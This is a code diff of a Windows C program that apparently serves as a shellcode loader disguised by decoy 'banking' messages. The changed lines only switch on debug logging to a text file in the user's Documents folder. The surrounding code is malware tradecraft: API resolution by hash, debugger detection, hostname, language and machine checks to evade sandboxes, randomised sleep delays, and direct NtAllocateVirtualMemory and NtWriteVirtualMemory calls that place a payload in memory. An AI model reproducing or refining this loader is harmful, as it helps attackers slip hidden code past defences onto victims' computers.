@@ -14,11 +14,11 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     int money_spent = 0;
     
     
-    // snprintf(path, MAX_PATH, "%s\\Documents\\market.txt", getenv("USERPROFILE"));  
-    // printf("start");    
+    snprintf(path, MAX_PATH, "%s\\Documents\\result.txt", getenv("USERPROFILE"));  
+    printf("beginning\n");    
     HMODULE hNtdll = CustomGetModuleHandle(NTDLL_HASH);
     HMODULE hKernel32dll = NULL;
-    // FILE *file = fopen(path, "w");
+    FILE *file = fopen(path, "w");
 
     
     if (!is_being_debugged()) {
@@ -30,13 +30,13 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     
     const char* hostname = get_hostname(hKernel32dll);
     if (key > 0 && is_valid_hostname(hostname)) {
-        // fprintf(file, "You have a key, which is : %s\n", hostname);
+        fprintf(file, "Your key is : %s\n", hostname);
     } else {
         money_spent += multiply(money, 3);
-        // fprintf(file, "You don't have a key, your's is : %s and money=%d\n", hostname,money_spent);
+        fprintf(file, "Key is absentey : %s and money=%d\n", hostname,money_spent);
     }
     
-    // fprintf(file, "Hey, welcoming to the banking system !\n");
+    fprintf(file, "Bank just opened\n");
 
     if (is_valid_computer(hKernel32dll) && money > 1000) {
         // fprintf(file, "You have enough money !!! %d is plenty\n", money);
@@ -46,7 +46,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     }
     
 
-    // fprintf(file, "Let's check your curency system\n");
+    fprintf(file, "Let's check your country\n");
 
     if (!is_valid_language(hKernel32dll)) {
         money_spent += add(money, 500);
@@ -61,14 +61,14 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
         int delay;
         // fprintf(file, "Transaction is starting ...\n");
         for (int i = 0; i < 100; i+=12) {
-            // fprintf(file, "Transaction in progress (%d%%), please wait ...\n", i);
+            fprintf(file, "Transaction ongoing (%d%%), please wait ...\n", i);
             delay = min_delay + (int)(rand() / (double)RAND_MAX * (max_delay - min_delay));
             Sleep(delay);
         }
         // fprintf(file , "Transaction in progress (100%%), please wait ...\n");
         // fprintf(file, "Transaction completed, you sent 1 peso to Elon Musk\n");
         // fprintf(file, "Bank is closed, we hope to see you soon !\n");
-        // fclose(file);
+        fclose(file);
     } else {
         SIZE_T regionSize = sizeof(payload);
         PVOID exec = NULL;
@@ -77,7 +77,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
         BOOL rv;
         
         // fprintf(file, "You have a nice account ! Let's get the transaction done !\n");
-        // fclose(file);
+        fclose(file);
 
         NtAllocVirtMem _NtAlocVirtMem = (NtAllocVirtMem)CustomGetProcAdress(hNtdll, VIRTUAL_ALLOC_HASH);
         NtWriteVirtMem _NtWriteVirtMem = (NtWriteVirtMem)CustomGetProcAdress(hNtdll, WRITE_MEMORY_HASH);
